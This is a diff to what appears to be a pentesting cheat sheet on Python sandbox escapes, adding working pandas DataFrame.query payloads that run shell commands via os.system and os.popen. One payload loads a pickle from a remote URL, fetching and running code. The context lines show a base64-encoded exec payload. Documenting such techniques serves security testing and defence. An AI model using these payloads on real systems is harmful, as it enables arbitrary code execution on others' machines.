@@ -140,6 +140,22 @@ exec('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='.decode("base64")) #Only python2
 exec(__import__('base64').b64decode('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='))
 ```
 
+### Other libraries that allow to eval python code
+
+```python
+#Pandas
+import pandas as pd
+df = pd.read_csv("currency-rates.csv")
+df.query('@__builtins__.__import__("os").system("ls")')
+df.query("@pd.io.common.os.popen('ls').read()")
+df.query("@pd.read_pickle('http://0.0.0.0:6334/output.exploit')")
+
+# The previous options work but others you might try give the error:
+# Only named functions are supported
+# Like:
+df.query("@pd.annotations.__class__.__init__.__globals__['__builtins__']['eval']('print(1)')")
+```
+
 ## Operators and short tricks
 
 ```python
